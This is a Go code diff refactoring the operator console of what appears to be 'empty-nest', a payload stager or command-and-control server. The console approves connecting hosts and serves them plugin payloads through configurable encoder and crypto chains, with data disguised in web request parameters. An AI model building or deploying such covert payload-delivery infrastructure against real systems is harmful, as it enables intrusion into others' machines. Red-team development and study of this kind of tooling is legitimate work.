@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/hex"
 	"fmt"
 	"net/http"
 	"os"
@@ -9,7 +10,6 @@ import (
 
 	"github.com/asdine/storm"
 	"github.com/empty-nest/server"
-	"github.com/empty-nest/server/stager"
 )
 
 func checkAndPanic(err error) {
@@ -18,13 +18,17 @@ func checkAndPanic(err error) {
 	}
 }
 
-// HostChanMap ...
-var HostChanMap = map[int]chan emptynest.Payload{}
+var (
+	db          *storm.DB
+	payloadMap  map[string]emptynest.PayloadPlugin
+	hostChanMap = map[int]chan emptynest.ApprovalResponse{}
+)
 
 func main() {
-	db, err := storm.Open("data.db")
+	config, err := emptynest.DecodeConfigFile("config.toml")
 	checkAndPanic(err)
-	err = db.Init(&emptynest.Key{})
+
+	db, err = storm.Open(config.DBFile)
 	checkAndPanic(err)
 	err = db.Init(&emptynest.Host{})
 	checkAndPanic(err)
@@ -33,16 +37,36 @@ func main() {
 
 	reader := bufio.NewReader(os.Stdin)
 
-	// TODO: parse server variables
 	// TODO: catch ctrl-c db.Close()
+	payloadMap, err = emptynest.PayloadMap(config.PayloadPluginDirectories)
+	checkAndPanic(err)
+	encoderChain, err := emptynest.BuildEncoderChain(config.EncoderPluginChain)
+	checkAndPanic(err)
+	cryptoChain, err := emptynest.BuildCryptoChain(config.CryptoPluginChain)
+	checkAndPanic(err)
+	var keyChain [][]byte
+	for _, k := range config.KeyChain {
+		key, err := hex.DecodeString(k)
+		checkAndPanic(err)
+		keyChain = append(keyChain, key)
+	}
+	infoPlugin, err := emptynest.BuildHostInfoPlugin(config.HostInfoPlugin)
+	checkAndPanic(err)
+
 	fmt.Println("[-] Starting server")
-	serve := stager.Server{}
-	serve.BodyByteOffset = 2
-	serve.CryptoByteOffset = 0
-	serve.DataLocation = "query"
-	serve.DataParam = "JSESSIONID"
-	serve.ApproveRequest = make(chan stager.ApprovalRequest)
-	serve.DB = db
+	serve := emptynest.Server{
+		ApproveRequest: make(chan emptynest.ApprovalRequest),
+		DB:             db,
+		EncoderChain:   encoderChain,
+		CryptoChain:    cryptoChain,
+		KeyChain:       keyChain,
+		HostInfo:       infoPlugin,
+		GetLocation:    config.GetLocation,
+		GetParam:       config.GetParam,
+		PostLocation:   config.PostLocation,
+		PostParam:      config.PostParam,
+		Debug:          config.ServerDebug,
+	}
 
 	// TODO: This needs to be configurable and use TLS too.
 	go func() {
@@ -58,15 +82,11 @@ func main() {
 		for {
 			request := <-serve.ApproveRequest
 			host := request.Host
-			HostChanMap[host.ID] = request.Chan
-			fmt.Printf("[!] APPROVAL REQUESTED:\nID: %d\nHostname: %s\nUsername: %s\nIP: %s\n", host.ID, host.Hostname, host.Username, host.IPAddress)
+			hostChanMap[host.ID] = request.Chan
+			fmt.Printf("[!] APPROVAL REQUESTED:\nID: %d\nInfo:%s\n", host.ID, host.Info)
 			fmt.Print("$> ")
 		}
 	}()
-
-	pmap, err := emptynest.PayloadMap("./plugins")
-	checkAndPanic(err)
-	m := menu{DB: db, HostChanMap: HostChanMap, PayloadMap: pmap}
 
 	fmt.Println("[-] Listening for messages")
 	for {
@@ -85,16 +105,12 @@ func main() {
 		switch command {
 		case "exit":
 			os.Exit(0)
-		case "keys":
-			m.keys(args)
 		case "hosts":
-			m.hosts(args)
-		case "cryptors":
-			fmt.Printf("* none\n")
+			hosts(args)
 		case "payloads":
-			m.payloads(args)
+			payloads(args)
 		case "help":
-			fmt.Printf("Valid comamnds:\nkeys\nhosts\ncryptors\npayloads\n")
+			fmt.Printf("Valid comamnds:\nhosts\n\npayloads\n")
 		default:
 			fmt.Printf("[!] Unknown command %s. Try 'help'\n", text)
 		}
